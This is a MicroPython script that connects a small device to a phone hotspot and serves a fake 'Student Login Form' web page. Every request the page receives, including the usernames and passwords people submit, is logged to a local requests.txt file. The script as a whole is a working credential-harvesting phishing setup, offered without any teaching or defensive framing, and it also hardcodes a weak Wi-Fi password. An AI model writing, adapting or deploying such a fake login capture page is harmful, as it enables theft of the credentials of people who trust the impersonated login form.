import network
import socket
from time import sleep
import machine

ssid = 'iPhone 13 (2)'
password = '12345678'

def connect():
    wlan = network.WLAN(network.STA_IF)
    wlan.active(True)
    wlan.connect(ssid, password)
    while wlan.isconnected() == False:
        print('Waiting for connection...')
        sleep(1)
    ip = wlan.ifconfig()[0]
    print(f'Connected on {ip}')
    return ip

def open_socket(ip):
    address=(ip,80)
    connection=socket.socket()
    connection.bind(address)
    connection.listen(1)
    return(connection)

def save_request_to_file(request):
    with open('requests.txt', 'a') as file:
        file.write(request + '\n')

def webpage():
    html = """
    <!DOCTYPE html>   
    <html>   
    <head>  
    <meta name="viewport" content="width=device-width, initial-scale=1">  
    <title> Login Page </title>   
    </head>    
    <body>    
        <center> <h1> Student Login Form </h1> </center>   
        <form>  
            <div class="container">   
                <label>Username : </label>   
                <input type="text" placeholder="Enter Username" name="username" required>  
                <label>Password : </label>   
                <input type="password" placeholder="Enter Password" name="password" required>  
                <button type="submit">Login</button>   
                <input type="checkbox" checked="checked"> Remember me   
                <button type="button" class="cancelbtn"> Cancel</button>   
                Forgot <a href="#"> password? </a>   
            </div>   
        </form>     
    </body>     
    </html>
    """
    return str(html)

def serve(connection):
    while True:
        client = connection.accept()[0]
        request = client.recv(1024)
        request = str(request)
        print(request)
        save_request_to_file(request)
        html = webpage()
        client.send(html)
        client.close()
try:
    ip = connect()
    connection = open_socket(ip)
    serve(connection)
except KeyboardInterrupt:
    machine.reset()